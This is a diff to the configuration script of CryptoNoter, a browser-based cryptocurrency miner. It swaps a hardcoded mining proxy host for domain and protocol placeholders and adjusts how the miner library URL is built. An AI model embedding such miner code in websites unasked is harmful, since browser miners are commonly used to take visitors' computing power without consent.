@@ -1,15 +1,14 @@
 self.CryptoNoter = self.CryptoNoter || {};
 self.CryptoNoter.CONFIG = {
-    LIB_URL: "https://%CryptoNoter_domain%/lib/",
-    // LIB_URL: "http://%CryptoNoter_domain%/lib/",
-    WEBSOCKET_SHARDS: [["wss://m.prominer.online/proxy"]],
-    // WEBSOCKET_SHARDS: [["wss://%CryptoNoter_domain%/proxy"]],
+    LIB_URL: "//%CryptoNoter_domain%/lib/",
+    WEBSOCKET_SHARDS: [["%ws_protocol%://%CryptoNoter_domain%/proxy"]],
     CAPTCHA_URL: "//%CryptoNoter_domain%/captcha/",
     MINER_URL: "//%CryptoNoter_domain%/media/miner.html"
 };
 var Module = {
     locateFile: (function (path) {
-        return CryptoNoter.CONFIG.LIB_URL + path
+        const protocolOriginal = (new URL(location.origin)).protocol;
+        return protocolOriginal+CryptoNoter.CONFIG.LIB_URL + path
     })
 };
 var Module;
